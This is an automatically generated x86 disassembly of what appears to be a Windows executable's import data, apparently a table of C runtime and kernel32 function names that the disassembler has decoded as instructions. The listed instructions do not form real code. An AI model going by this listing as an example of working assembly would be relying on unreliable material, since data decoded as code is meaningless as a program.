  41d676:	add    DWORD PTR [eax],eax
  41d678:	pop    esp
  41d679:	fiadd  WORD PTR [ecx]
  41d67b:	add    BYTE PTR [esi+ebx*8+0x1],dh
  41d67f:	add    BYTE PTR [edx-0x71fffe22],al
  41d685:	fiadd  WORD PTR [ecx]
  41d687:	add    BYTE PTR [edx+0x1de],ah
  41d68d:	add    BYTE PTR [eax],al
  41d68f:	add    al,al
  41d691:	fiadd  WORD PTR [ecx]
  41d693:	add    dl,cl
  41d695:	fiadd  WORD PTR [ecx]
  41d697:	add    ah,dl
  41d699:	fiadd  WORD PTR [ecx]
  41d69b:	add    al,ah
  41d69d:	fiadd  WORD PTR [ecx]
  41d69f:	add    ah,dh
  41d6a1:	fiadd  WORD PTR [ecx]
  41d6a3:	add    BYTE PTR [eax],al
  41d6a5:	fild   WORD PTR [ecx]
  41d6a7:	add    BYTE PTR [edx],bl
  41d6a9:	fild   WORD PTR [ecx]
  41d6ab:	add    BYTE PTR [edx],ch
  41d6ad:	fild   WORD PTR [ecx]
  41d6af:	add    BYTE PTR [eax],bh
  41d6b1:	fild   WORD PTR [ecx]
  41d6b3:	add    BYTE PTR [eax-0x21],dl
  41d6b6:	add    DWORD PTR [eax],eax
  41d6b8:	fild   WORD PTR fs:[ecx]
  41d6bb:	add    BYTE PTR [esi-0x21],bh
  41d6be:	add    DWORD PTR [eax],eax
  41d6c0:	mov    edi,ds
  41d6c2:	add    DWORD PTR [eax],eax
  41d6c4:	cwde   
  41d6c5:	fild   WORD PTR [ecx]
  41d6c7:	add    BYTE PTR [esi-0x45fffe21],ah
  41d6cd:	fild   WORD PTR [ecx]
  41d6cf:	add    dh,al
  41d6d1:	fild   WORD PTR [ecx]
  41d6d3:	add    dh,dl
  41d6d5:	fild   WORD PTR [ecx]
  41d6d7:	add    dh,ah
  41d6d9:	fild   WORD PTR [ecx]
  41d6db:	add    ah,bh
  41d6dd:	fild   WORD PTR [ecx]
  41d6df:	add    BYTE PTR [eax],cl
  41d6e1:	loopne 0x41d6e4
  41d6e3:	add    BYTE PTR [eax+eiz*8],dl
  41d6e6:	add    DWORD PTR [eax],eax
  41d6e8:	sub    al,ah
  41d6ea:	add    DWORD PTR [eax],eax
  41d6ec:	ds loopne 0x41d6f0
  41d6ef:	add    BYTE PTR [esi-0x20],dl
  41d6f2:	add    DWORD PTR [eax],eax
  41d6f4:	data16 loopne 0x41d6f8
  41d6f7:	add    BYTE PTR [edx-0x20],dh
  41d6fa:	add    DWORD PTR [eax],eax
  41d6fc:	xchg   al,ah
  41d6fe:	add    DWORD PTR [eax],eax
  41d700:	xchg   esp,eax
  41d701:	loopne 0x41d704
  41d703:	add    BYTE PTR [esi-0x47fffe20],ch
  41d709:	loopne 0x41d70c
  41d70b:	add    dl,cl
  41d70d:	loopne 0x41d710
  41d70f:	add    ah,bl
  41d711:	loopne 0x41d714
  41d713:	add    dh,ch
  41d715:	loopne 0x41d718
  41d717:	add    dh,bh
  41d719:	loopne 0x41d71c
  41d71b:	add    BYTE PTR [eax],cl
  41d71d:	loope  0x41d720
  41d71f:	add    BYTE PTR [esi],bl
  41d721:	loope  0x41d724
  41d723:	add    BYTE PTR [edx],dh
  41d725:	loope  0x41d728
  41d727:	add    BYTE PTR [esi-0x1f],al
  41d72a:	add    DWORD PTR [eax],eax
  41d72c:	push   esi
  41d72d:	loope  0x41d730
  41d72f:	add    BYTE PTR [esi-0x1f],ah
  41d732:	add    DWORD PTR [eax],eax
  41d734:	jb     0x41d717
  41d736:	add    DWORD PTR [eax],eax
  41d738:	test   cl,ah
  41d73a:	add    DWORD PTR [eax],eax
  41d73c:	mov    al,ds:0xb60001e1
  41d741:	loope  0x41d744
  41d743:	add    dl,al
  41d745:	loope  0x41d748
  41d747:	add    dh,dl
  41d749:	loope  0x41d74c
  41d74b:	add    BYTE PTR [eax],al
  41d74d:	add    BYTE PTR [eax],al
  41d74f:	add    ah,dh
  41d751:	loope  0x41d754
  41d753:	add    BYTE PTR [edx+eiz*8],al
  41d756:	add    DWORD PTR [eax],eax
  41d758:	adc    al,0xe2
  41d75a:	add    DWORD PTR [eax],eax
  41d75c:	and    ah,dl
  41d75e:	add    DWORD PTR [eax],eax
  41d760:	xor    dl,ah
  41d762:	add    DWORD PTR [eax],eax
  41d764:	ds loop 0x41d768
  41d767:	add    BYTE PTR [edx-0x1e],dl
  41d76a:	add    DWORD PTR [eax],eax
  41d76c:	pusha  
  41d76d:	loop   0x41d770
  41d76f:	add    BYTE PTR [edx-0x1e],bh
  41d772:	add    DWORD PTR [eax],eax
  41d774:	xchg   dl,ah
  41d776:	add    DWORD PTR [eax],eax
  41d778:	cwde   
  41d779:	loop   0x41d77c
  41d77b:	add    BYTE PTR [edx+eiz*8-0x1d47ffff],ah
  41d782:	add    DWORD PTR [eax],eax
  41d784:	int3   
  41d785:	loop   0x41d788
  41d787:	add    dh,dl
  41d789:	loop   0x41d78c
  41d78b:	add    al,ah
  41d78d:	loop   0x41d790
  41d78f:	add    dl,bh
  41d791:	loop   0x41d794
  41d793:	add    BYTE PTR [edx],cl
  41d795:	jecxz  0x41d798
  41d797:	add    BYTE PTR [edx],bl
  41d799:	jecxz  0x41d79c
  41d79b:	add    BYTE PTR [ebx+eiz*8],ah
  41d79e:	add    DWORD PTR [eax],eax
  41d7a0:	xor    al,0xe3
  41d7a2:	add    DWORD PTR [eax],eax
  41d7a4:	inc    eax
  41d7a5:	jecxz  0x41d7a8
  41d7a7:	add    BYTE PTR [esi-0x1d],cl
  41d7aa:	add    DWORD PTR [eax],eax
  41d7ac:	fs jecxz 0x41d7b0
  41d7af:	add    BYTE PTR [esi-0x1d],dh
  41d7b2:	add    DWORD PTR [eax],eax
  41d7b4:	mov    fs,ebx
  41d7b6:	add    DWORD PTR [eax],eax
  41d7b8:	mov    ds:0xb00001e3,al
  41d7bd:	jecxz  0x41d7c0
  41d7bf:	add    dl,al
  41d7c1:	jecxz  0x41d7c4
  41d7c3:	add    dh,cl
  41d7c5:	jecxz  0x41d7c8
  41d7c7:	add    dh,bl
  41d7c9:	jecxz  0x41d7cc
  41d7cb:	add    ah,ch
  41d7cd:	jecxz  0x41d7d0
  41d7cf:	add    BYTE PTR [eax],al
  41d7d1:	in     al,0x1
  41d7d3:	add    BYTE PTR [esi],cl
  41d7d5:	in     al,0x1
  41d7d7:	add    BYTE PTR [edx],ch
  41d7d9:	in     al,0x1
  41d7db:	add    BYTE PTR [esp+eiz*8],bh
  41d7de:	add    DWORD PTR [eax],eax
  41d7e0:	dec    esp
  41d7e1:	in     al,0x1
  41d7e3:	add    BYTE PTR [esi-0x1c],bl
  41d7e6:	add    DWORD PTR [eax],eax
  41d7e8:	push   0xffffffe4
  41d7ea:	add    DWORD PTR [eax],eax
  41d7ec:	jl     0x41d7d2
  41d7ee:	add    DWORD PTR [eax],eax
  41d7f0:	mov    ah,ah
  41d7f2:	add    DWORD PTR [eax],eax
  41d7f4:	cwde   
  41d7f5:	in     al,0x1
  41d7f7:	add    BYTE PTR [esi-0x3ffffe1c],ch
  41d7fd:	in     al,0x1
  41d7ff:	add    al,dl
  41d801:	in     al,0x1
  41d803:	add    dl,ah
  41d805:	in     al,0x1
  41d807:	add    al,dh
  41d809:	in     al,0x1
  41d80b:	add    BYTE PTR [eax],cl
  41d80d:	in     eax,0x1
  41d80f:	add    BYTE PTR [eiz*8-0x1ad5ffff],bl
  41d816:	add    DWORD PTR [eax],eax
  41d818:	ds in  eax,0x1
  41d81b:	add    BYTE PTR [edx-0x1b],cl
  41d81e:	add    DWORD PTR [eax],eax
  41d820:	pop    edx
  41d821:	in     eax,0x1
  41d823:	add    BYTE PTR [esi-0x1b],ch
  41d826:	add    DWORD PTR [eax],eax
  41d828:	jle    0x41d80f
  41d82a:	add    DWORD PTR [eax],eax
  41d82c:	nop
  41d82d:	in     eax,0x1
  41d82f:	add    BYTE PTR [ebp+eiz*8-0x1a55ffff],bl
  41d836:	add    DWORD PTR [eax],eax
  41d838:	mov    eax,0xca0001e5
  41d83d:	in     eax,0x1
  41d83f:	add    dl,bl
  41d841:	in     eax,0x1
  41d843:	add    dh,ah
  41d845:	in     eax,0x1
  41d847:	add    ah,bh
  41d849:	in     eax,0x1
  41d84b:	add    BYTE PTR [esi],cl
  41d84d:	out    0x1,al
  41d84f:	add    BYTE PTR [eax],ch
  41d851:	out    0x1,al
  41d853:	add    BYTE PTR [edx],bh
  41d855:	out    0x1,al
  41d857:	add    BYTE PTR [esi+eiz*8+0x1],cl
  41d85b:	add    BYTE PTR [eax-0x1a],bl
  41d85e:	add    DWORD PTR [eax],eax
  41d860:	push   0x7a0001e6
  41d865:	out    0x1,al
  41d867:	add    BYTE PTR [esi-0x67fffe1a],al
  41d86d:	out    0x1,al
  41d86f:	add    BYTE PTR [edx-0x35fffe1a],dh
  41d875:	out    0x1,al
  41d877:	add    ah,bl
  41d879:	out    0x1,al
  41d87b:	add    dl,ch
  41d87d:	out    0x1,al
  41d87f:	add    al,bh
  41d881:	out    0x1,al
  41d883:	add    BYTE PTR [esi],cl
  41d885:	out    0x1,eax
  41d887:	add    BYTE PTR [esi],bl
  41d889:	out    0x1,eax
  41d88b:	add    BYTE PTR [edx],ch
  41d88d:	out    0x1,eax
  41d88f:	add    BYTE PTR [edx],bh
  41d891:	out    0x1,eax
  41d893:	add    BYTE PTR [edx-0x19],cl
  41d896:	add    DWORD PTR [eax],eax
  41d898:	pop    esp
  41d899:	out    0x1,eax
  41d89b:	add    BYTE PTR [eax-0x19],ch
  41d89e:	add    DWORD PTR [eax],eax
  41d8a0:	jbe    0x41d889
  41d8a2:	add    DWORD PTR [eax],eax
  41d8a4:	xchg   bh,ah
  41d8a6:	add    DWORD PTR [eax],eax
  41d8a8:	cwde   
  41d8a9:	out    0x1,eax
  41d8ab:	add    BYTE PTR [eax-0x45fffe19],ch
  41d8b1:	out    0x1,eax
  41d8b3:	add    al,dl
  41d8b5:	out    0x1,eax
  41d8b7:	add    dh,ah
  41d8b9:	out    0x1,eax
  41d8bb:	add    dh,dh
  41d8bd:	out    0x1,eax
  41d8bf:	add    BYTE PTR [edx],al
  41d8c1:	call   0xe859d8c7
  41d8c6:	add    DWORD PTR [eax],eax
  41d8c8:	and    al,0xe8
  41d8ca:	add    DWORD PTR [eax],eax
  41d8cc:	xor    al,0xe8
  41d8ce:	add    DWORD PTR [eax],eax
  41d8d0:	dec    eax
  41d8d1:	call   0xe897d8d7
  41d8d6:	add    DWORD PTR [eax],eax
  41d8d8:	callw  0xd8dd
  41d8dc:	jp     0x41d8c6
  41d8de:	add    DWORD PTR [eax],eax
  41d8e0:	xchg   al,ch
  41d8e2:	add    DWORD PTR [eax],eax
  41d8e4:	xchg   esi,eax
  41d8e5:	call   0xe8e3d8eb
  41d8ea:	add    DWORD PTR [eax],eax
  41d8ec:	mov    dl,0xe8
  41d8ee:	add    DWORD PTR [eax],eax
  41d8f0:	(bad)  
  41d8f1:	call   0xe913d8f7
  41d8f6:	add    DWORD PTR [eax],eax
  41d8f8:	in     al,0xe8
  41d8fa:	add    DWORD PTR [eax],eax
  41d8fc:	lock call 0xe93fd903
  41d902:	add    DWORD PTR [eax],eax
  41d904:	or     al,0xe9
  41d906:	add    DWORD PTR [eax],eax
  41d908:	sbb    ch,cl
  41d90a:	add    DWORD PTR [eax],eax
  41d90c:	add    BYTE PTR [eax],al
  41d90e:	add    BYTE PTR [eax],al
  41d910:	or     al,0x2
  41d912:	add    BYTE PTR [eax+0x0],al
  41d918:	cmc    
  41d919:	add    BYTE PTR [edi+0x63],bl
  41d91c:	outs   dx,DWORD PTR ds:[esi]
  41d91d:	outs   dx,BYTE PTR ds:[esi]
  41d91e:	je     0x41d992
  41d920:	outs   dx,DWORD PTR ds:[esi]
  41d921:	ins    BYTE PTR es:[edi],dx
  41d922:	data16 jo 0x41d925
  41d925:	add    BYTE PTR [ebx],al
  41d927:	add    al,0x73
  41d929:	jns    0x41d99e
  41d92b:	je     0x41d992
  41d92d:	ins    DWORD PTR es:[edi],dx
  41d92e:	add    BYTE PTR [eax],al
  41d930:	fwait
  41d931:	add    ebp,DWORD PTR [ecx+0x73]
  41d934:	jo     0x41d9a8
  41d936:	imul   ebp,DWORD PTR [esi+0x74],0x61035a00
  41d93d:	je     0x41d9ae
  41d93f:	ins    BYTE PTR es:[edi],dx
  41d940:	add    BYTE PTR [eax],al
  41d942:	jmp    0x7363:0x72747303
  41d949:	jo     0x41d9b9
  41d94b:	add    BYTE PTR [edi+0x73626d03],dh
  41d951:	je     0x41d9c2
  41d953:	ja     0x41d9b8
  41d955:	jae    0x41d957
  41d957:	add    bh,ah
  41d959:	add    esi,DWORD PTR [ebx+0x74]
  41d95c:	jb     0x41d9c1
  41d95e:	outs   dx,DWORD PTR ds:[esi]
  41d95f:	ins    BYTE PTR es:[edi],dx
  41d960:	ins    BYTE PTR es:[edi],dx
  41d961:	add    ch,al
  41d963:	add    esi,DWORD PTR [eax+0x72]
  41d966:	imul   ebp,DWORD PTR [esi+0x74],0xb000066
  41d96d:	add    al,0x74
  41d96f:	outs   dx,DWORD PTR ds:[esi]
  41d970:	ja     0x41d9de
  41d972:	outs   dx,DWORD PTR ds:[esi]
  41d973:	ja     0x41d9da
  41d975:	jb     0x41d977
  41d977:	add    BYTE PTR [esi],al
  41d979:	add    al,0x74
  41d97b:	imul   ebp,DWORD PTR [ebp+0x65],0x36d0000
  41d982:	data16 addr16 gs je 0x41d9ea
  41d987:	add    BYTE PTR [ebx+0x735f5f00],dh
  41d98d:	gs je  0x41d9ef
  41d990:	popa   
  41d991:	jo     0x41da03
  41d993:	pop    edi
  41d994:	je     0x41da0f
  41d996:	jo     0x41d9fd
  41d998:	add    BYTE PTR [eax],al
  41d99a:	mov    al,ds:0x705f5f00
  41d99f:	pop    edi
  41d9a0:	pop    edi
  41d9a1:	ins    WORD PTR es:[edi],dx
  41d9a3:	outs   dx,DWORD PTR ds:[esi]
  41d9a4:	fs add BYTE PTR gs:[eax],al
  41d9a8:	xchg   esp,eax
  41d9a9:	add    ebp,DWORD PTR [ecx+0x73]
  41d9ac:	popa   
  41d9ad:	ins    BYTE PTR es:[edi],dx
  41d9ae:	outs   dx,BYTE PTR ds:[esi]
  41d9af:	jne    0x41da1e
  41d9b1:	add    dl,bh
  41d9b3:	add    esi,DWORD PTR [ebx+0x74]
  41d9b6:	jb     0x41da2c
  41d9b8:	outs   dx,DWORD PTR ds:[esi]
  41d9b9:	imul   eax,DWORD PTR [eax],0x0
  41d9bc:	sbb    al,0x4
  41d9be:	ja     0x41da23
  41d9c0:	jae    0x41da25
  41d9c2:	popa   
  41d9c3:	je     0x41d9c5
  41d9c5:	add    BYTE PTR [ecx+0x74626d03],bh
  41d9cb:	outs   dx,DWORD PTR ds:[esi]
  41d9cc:	ja     0x41da31
  41d9ce:	add    BYTE PTR [eax],al
  41d9d0:	fwait
  41d9d1:	add    BYTE PTR [edi+0x5f],bl
  41d9d4:	jo     0x41da35
  41d9d6:	pop    edi
  41d9d7:	arpl   WORD PTR [edi+0x6d],bp
  41d9da:	ins    DWORD PTR es:[edi],dx
  41d9db:	outs   dx,DWORD PTR ds:[esi]
  41d9dc:	fs add BYTE PTR gs:[eax],al
  41d9e0:	loope  0x41d9e5
  41d9e2:	jae    0x41da57
  41d9e4:	arpl   WORD PTR [ecx+0x6e],sp
  41d9e7:	data16 add BYTE PTR [eax],al
  41d9ea:	fild   DWORD PTR [eax]
  41d9ec:	pop    edi
  41d9ed:	popa   
  41d9ee:	ins    DWORD PTR es:[edi],dx
  41d9ef:	jae    0x41da58
  41d9f1:	pop    edi
  41d9f2:	gs js  0x41da5e
  41d9f5:	je     0x41d9f7
  41d9f7:	add    BYTE PTR [esi+0x6e695f01],al
  41d9fd:	imul   esi,DWORD PTR [esp+esi*2+0x65],0xc8006d72
  41da05:	add    esi,DWORD PTR [eax+0x75]
  41da08:	je     0x41da6d
  41da0a:	push   0xb1007261
  41da0f:	add    ebp,DWORD PTR [edi+ebp*2+0x63]
  41da13:	popa   
  41da14:	ins    BYTE PTR es:[edi],dx
  41da15:	je     0x41da80
  41da17:	ins    DWORD PTR es:[edi],dx
  41da18:	add    BYTE PTR gs:[ecx+0x3],ch
  41da1c:	data16 arpl WORD PTR [edi+ebp*2+0x73],bp
  41da21:	add    BYTE PTR gs:[eax],al
  41da24:	or     eax,0x676e7504
  41da29:	gs je  0x41da8f
  41da2c:	add    BYTE PTR [eax],al
  41da2e:	sub    DWORD PTR [edi+esi*2],eax
  41da31:	arpl   WORD PTR [ebx+0x6e],si
  41da34:	arpl   WORD PTR [eax+0x79],si
  41da37:	add    bh,cl
  41da39:	add    esi,DWORD PTR [edx+0x61]
  41da3c:	outs   dx,BYTE PTR ds:[esi]
  41da3d:	add    BYTE PTR fs:[eax],al
  41da40:	sahf   
  41da41:	add    DWORD PTR [edi+0x69],ebx
  41da44:	jae    0x41dab3
  41da46:	bound  esp,QWORD PTR [edx+0x6c]
  41da49:	gs popa 
  41da4b:	add    BYTE PTR fs:[eax],al
  41da4e:	add    DWORD PTR [ebx+esi*2],eax
  41da51:	ja     0x41dac6
  41da53:	arpl   WORD PTR [ecx+0x6e],sp
  41da56:	data16 add BYTE PTR [ebx+0x77736903],ch
  41da5d:	js     0x41dac3
  41da5f:	imul   esp,DWORD PTR [edi+0x69],0x4280074
  41da66:	ja     0x41dacb
  41da68:	jae    0x41dad8
  41da6a:	arpl   WORD PTR [ebp+0x70],bp
  41da6d:	add    BYTE PTR [esi+0x75736903],bl
  41da73:	jo     0x41dae5
  41da75:	gs jb  0x41da78
  41da78:	push   edx
  41da79:	add    BYTE PTR [edi+0x58],bl
  41da7c:	arpl   WORD PTR [eax+0x74],si
  41da7f:	inc    esi
  41da80:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x1230072
  41da88:	pop    edi
  41da89:	gs js  0x41daf5
  41da8c:	je     0x41da8e
  41da8e:	sbb    BYTE PTR [esi+esi*2],al
  41da91:	jae    0x41db0a
  41da93:	jo     0x41db07
  41da95:	imul   ebp,DWORD PTR [esi+0x74],0xe80066
  41da9c:	pop    edi
  41da9d:	arpl   WORD PTR [ebp+0x78],sp
  41daa0:	imul   esi,DWORD PTR [eax+eax*1+0x0],0x7362035b
  41daa8:	gs popa 
  41daaa:	jb     0x41db0f
  41daac:	push   0x7303e800
  41dab1:	je     0x41db25
  41dab3:	arpl   WORD PTR [eax+0x79],si
  41dab6:	add    BYTE PTR [eax],al
  41dab8:	mov    ch,0x0
  41daba:	pop    edi
  41dabb:	pop    edi
  41dabc:	jae    0x41db23
  41dabe:	je     0x41db35
  41dac0:	jae    0x41db27
  41dac2:	jb     0x41db31
  41dac4:	popa   
  41dac5:	je     0x41db2f
  41dac7:	gs jb  0x41db3c
  41daca:	add    BYTE PTR [eax],al
  41dacc:	jb     0x41dace
  41dace:	pop    edi
  41dacf:	pop    edi
  41dad0:	addr16 gs je 0x41db41
  41dad4:	popa   
  41dad5:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  41dadc:	pop    edi
  41dadd:	add    esp,DWORD PTR [ebx+0x6c]
  41dae0:	gs popa 
  41dae2:	jb     0x41db49
  41dae4:	jb     0x41db58
  41dae6:	add    BYTE PTR [eax],al
  41dae8:	and    DWORD PTR [edi+esi*2],eax
  41daeb:	arpl   WORD PTR [ebx+0x63],si
  41daee:	jo     0x41db69
  41daf0:	add    BYTE PTR [eax],al
  41daf2:	std    
  41daf3:	add    esi,DWORD PTR [ebx+0x74]
  41daf6:	jb     0x41db6c
  41daf8:	outs   dx,DWORD PTR ds:[esi]
  41daf9:	jne    0x41db67
  41dafb:	add    bl,al
  41dafd:	add    esi,DWORD PTR [eax+0x65]
  41db00:	jb     0x41db74
  41db02:	outs   dx,DWORD PTR ds:[esi]
  41db03:	jb     0x41db05
  41db05:	add    BYTE PTR [ebp+0x53],cl
  41db08:	push   esi
  41db09:	inc    ebx
  41db0a:	push   edx
  41db0b:	push   esp
  41db0c:	cs fs ins BYTE PTR es:[edi],dx
  41db0f:	ins    BYTE PTR es:[edi],dx
  41db10:	add    BYTE PTR [eax],al
  41db12:	inc    ecx
  41db13:	add    al,0x53
  41db15:	gs je  0x41db6d
  41db18:	outs   dx,BYTE PTR ds:[esi]
  41db19:	push   0x6c646e61
  41db1e:	gs fs inc ebp
  41db21:	js     0x41db86
  41db23:	gs jo  0x41db9a
  41db26:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  41db2d:	gs jb  0x41db30
  41db30:	jmp    0x6946:0x74654701
  41db37:	ins    BYTE PTR es:[edi],dx
  41db38:	gs inc ecx
  41db3a:	je     0x41dbb0
  41db3c:	jb     0x41dba7
  41db3e:	bound  esi,QWORD PTR [ebp+0x74]
  41db41:	gs jae 0x41db89
  41db44:	js     0x41db87
  41db46:	add    BYTE PTR [eax],al
  41db48:	pop    esp
  41db49:	add    DWORD PTR [esi+0x69],eax
  41db4c:	outs   dx,BYTE PTR ds:[esi]
  41db4d:	fs inc esi
  41db4f:	imul   esi,DWORD PTR [edx+0x73],0x61684374
  41db56:	outs   dx,BYTE PTR ds:[esi]
  41db57:	addr16 gs dec esi
  41db5a:	outs   dx,DWORD PTR ds:[esi]
  41db5b:	je     0x41dbc6
  41db5d:	imul   sp,WORD PTR [ebx+0x61],0x6974
  41db63:	outs   dx,DWORD PTR ds:[esi]
  41db64:	outs   dx,BYTE PTR ds:[esi]
  41db65:	push   edi
  41db66:	add    BYTE PTR [eax],al
  41db68:	mov    ds:0x6c614300,al
  41db6d:	ins    BYTE PTR es:[edi],dx
  41db6e:	dec    esi
  41db6f:	popa   
  41db70:	ins    DWORD PTR es:[edi],dx
  41db71:	gs fs push eax
  41db74:	imul   esi,DWORD PTR [eax+0x65],0xdb000057
  41db7b:	add    cl,BYTE PTR [ecx+0x73]
  41db7e:	push   esi
  41db7f:	popa   
  41db80:	ins    BYTE PTR es:[edi],dx
  41db81:	imul   esp,DWORD PTR [esp+ecx*2+0x6f],0x656c6163
  41db89:	add    BYTE PTR [ebp+0x1],ah
  41db8c:	inc    esi
  41db8d:	imul   ebp,DWORD PTR [esi+0x64],0x7478654e
  41db94:	inc    ebx
  41db95:	push   0x65676e61
  41db9a:	dec    esi
  41db9b:	outs   dx,DWORD PTR ds:[esi]
  41db9c:	je     0x41dc07
  41db9e:	imul   sp,WORD PTR [ebx+0x61],0x6974
  41dba4:	outs   dx,DWORD PTR ds:[esi]
  41dba5:	outs   dx,BYTE PTR ds:[esi]
  41dba6:	add    BYTE PTR [eax],al
  41dba8:	cmp    BYTE PTR [ebx+edx*2],al
  41dbab:	gs je  0x41dc02
  41dbae:	push   0x64616572
  41dbb3:	inc    ebp
  41dbb4:	js     0x41dc1b
  41dbb6:	arpl   WORD PTR [ebp+0x74],si
  41dbb9:	imul   ebp,DWORD PTR [edi+0x6e],0x74617453
  41dbc0:	add    BYTE PTR gs:[esi],bl
  41dbc3:	add    al,BYTE PTR [edi+0x65]
  41dbc6:	je     0x41dc18
  41dbc8:	jb     0x41dc33
  41dbca:	outs   dx,DWORD PTR ds:[esi]
  41dbcb:	jb     0x41dc36
  41dbcd:	je     0x41dc48
  41dbcf:	inc    ebx
  41dbd0:	ins    BYTE PTR es:[edi],dx
  41dbd1:	popa   
  41dbd2:	jae    0x41dc47
  41dbd4:	add    BYTE PTR [eax],al
  41dbd6:	add    DWORD PTR [bp+0x69],eax
  41dbda:	outs   dx,BYTE PTR ds:[esi]
  41dbdb:	fs dec esi
  41dbdd:	gs js  0x41dc54
  41dbe0:	inc    esi
  41dbe1:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x57048d00
  41dbe9:	popa   
  41dbea:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x6c754d72
  41dbf2:	je     0x41dc5d
  41dbf4:	jo     0x41dc62
  41dbf6:	gs dec edi
  41dbf8:	bound  ebp,QWORD PTR [edx+0x65]
  41dbfb:	arpl   WORD PTR [ebx+esi*2+0x45],si
  41dbff:	js     0x41dc01
  41dc01:	add    BYTE PTR [edi],ah
  41dc03:	add    al,0x53
  41dc05:	gs je  0x41dc56
  41dc08:	popa   
  41dc09:	ins    DWORD PTR es:[edi],dx
  41dc0a:	gs fs push eax
  41dc0d:	imul   esi,DWORD PTR [eax+0x65],0x646e6148
  41dc14:	ins    BYTE PTR es:[edi],dx
  41dc15:	gs push ebx
  41dc17:	je     0x41dc7a
  41dc19:	je     0x41dc80
  41dc1b:	add    bl,bh
  41dc1d:	add    DWORD PTR [edi+0x65],eax
  41dc20:	je     0x41dc6e
  41dc22:	popa   
  41dc23:	jae    0x41dc99
  41dc25:	inc    ebp
  41dc26:	jb     0x41dc9a
  41dc28:	outs   dx,DWORD PTR ds:[esi]
  41dc29:	jb     0x41dc2b
  41dc2b:	add    BYTE PTR [eax+0x6f6c4702],dl
  41dc31:	bound  esp,QWORD PTR [ecx+0x6c]
  41dc34:	inc    esi
  41dc35:	jb     0x41dc9c
  41dc37:	add    BYTE PTR gs:[eax],al
  41dc3a:	or     al,BYTE PTR [edx]
  41dc3c:	inc    edi
  41dc3d:	gs je  0x41dc8d
  41dc40:	outs   dx,DWORD PTR ds:[esi]
  41dc41:	fs jne 0x41dcb0
  41dc44:	gs dec eax
  41dc46:	popa   
  41dc47:	outs   dx,BYTE PTR ds:[esi]
  41dc48:	fs ins BYTE PTR es:[edi],dx
  41dc4a:	gs inc ecx
  41dc4c:	add    BYTE PTR [eax],al
  41dc4e:	js     0x41dc53
  41dc50:	push   edx
  41dc51:	gs popa 
  41dc53:	fs inc esi
  41dc55:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x47019000
  41dc5d:	gs je  0x41dca3
  41dc60:	push   eax
  41dc61:	dec    ecx
  41dc62:	outs   dx,BYTE PTR ds:[esi]
  41dc63:	outs   dx,WORD PTR ds:[esi]
  41dc65:	add    BYTE PTR ds:0x74655304,ah
  41dc6b:	dec    ebp
  41dc6c:	popa   
  41dc6d:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x6e49746f
  41dc75:	outs   dx,WORD PTR ds:[esi]
  41dc77:	add    dh,bh
  41dc79:	add    DWORD PTR [edi+0x65],eax
  41dc7c:	je     0x41dcca
  41dc7e:	outs   dx,DWORD PTR ds:[esi]
  41dc7f:	arpl   WORD PTR [ecx+0x6c],sp
  41dc82:	gs dec ecx
  41dc84:	outs   dx,BYTE PTR ds:[esi]
  41dc85:	outs   dx,WORD PTR ds:[esi]
  41dc87:	inc    ecx
  41dc88:	add    BYTE PTR [eax],al
  41dc8a:	push   es
  41dc8b:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  41dc8f:	fs dec esp
  41dc91:	imul   esp,DWORD PTR [edx+0x72],0x45797261
  41dc98:	js     0x41dcdb
  41dc9a:	add    BYTE PTR [eax],al
  41dc9c:	outs   dx,DWORD PTR ds:[esi]
  41dc9d:	add    al,BYTE PTR [edi+0x65]
  41dca0:	je     0x41dcf6
  41dca2:	imul   ebp,DWORD PTR [ebp+0x65],0x6d726f46
  41dca9:	popa   
  41dcaa:	je     0x41dced
  41dcac:	add    BYTE PTR [eax],al
  41dcae:	inc    DWORD PTR [ecx]
  41dcb0:	inc    edi
  41dcb1:	gs je  0x41dd00
  41dcb4:	outs   dx,DWORD PTR ds:[esi]
  41dcb5:	arpl   WORD PTR [ecx+0x6c],sp
  41dcb8:	gs dec ecx
  41dcba:	outs   dx,BYTE PTR ds:[esi]
  41dcbb:	outs   dx,WORD PTR ds:[esi]
  41dcbd:	push   edi
  41dcbe:	add    BYTE PTR [eax],al
  41dcc0:	rol    BYTE PTR [esp+ebp*2],0x73
  41dcc4:	je     0x41dd38
  41dcc6:	arpl   WORD PTR [ecx+0x74],sp
  41dcc9:	push   edi
  41dcca:	add    BYTE PTR [eax],al
  41dccc:	repnz add DWORD PTR [edi+0x65],eax
  41dcd0:	je     0x41dd18
  41dcd2:	jne    0x41dd40
  41dcd4:	ins    BYTE PTR es:[edi],dx
  41dcd5:	push   eax
  41dcd6:	popa   
  41dcd7:	je     0x41dd41
  41dcd9:	dec    esi
  41dcda:	popa   
  41dcdb:	ins    DWORD PTR es:[edi],dx
  41dcdc:	gs inc ecx
  41dcde:	add    BYTE PTR [eax],al
  41dce0:	cmp    al,0x3
  41dce2:	dec    edi
  41dce3:	jo     0x41dd4a
  41dce5:	outs   dx,BYTE PTR ds:[esi]
  41dce6:	inc    esi
  41dce7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  41dcef:	outs   dx,BYTE PTR ds:[esi]
  41dcf0:	addr16 push edi
  41dcf2:	add    BYTE PTR [eax],al
  41dcf4:	stc    
  41dcf5:	add    cl,BYTE PTR [ecx+0x73]
  41dcf8:	inc    edx
  41dcf9:	popa   
  41dcfa:	fs push ebx
  41dcfc:	je     0x41dd70
  41dcfe:	imul   ebp,DWORD PTR [esi+0x67],0x57727450
  41dd05:	add    dl,cl
  41dd07:	add    BYTE PTR [ebx+0x72],al
  41dd0a:	gs popa 
  41dd0c:	je     0x41dd73
  41dd0e:	inc    ebp
  41dd0f:	jbe    0x41dd76
  41dd11:	outs   dx,BYTE PTR ds:[esi]
  41dd12:	je     0x41dd55
  41dd14:	add    BYTE PTR [eax],al
  41dd16:	ins    DWORD PTR es:[edi],dx
  41dd17:	add    al,0x55
  41dd19:	outs   dx,BYTE PTR ds:[esi]
  41dd1a:	ins    BYTE PTR es:[edi],dx
  41dd1b:	outs   dx,DWORD PTR ds:[esi]
  41dd1c:	arpl   WORD PTR [ebx+0x46],bp
  41dd1f:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x45011300
  41dd27:	outs   dx,BYTE PTR ds:[esi]
